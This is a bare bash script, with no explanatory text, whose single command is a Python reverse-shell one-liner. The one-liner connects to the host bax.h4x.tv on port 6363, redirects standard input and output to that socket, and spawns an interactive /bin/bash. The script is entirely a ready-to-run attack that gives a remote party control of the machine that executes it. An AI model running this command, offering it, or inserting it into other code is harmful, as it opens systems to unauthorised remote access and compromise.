#/usr/bin/env bash

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("bax.h4x.tv",6363));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("/bin/bash")'
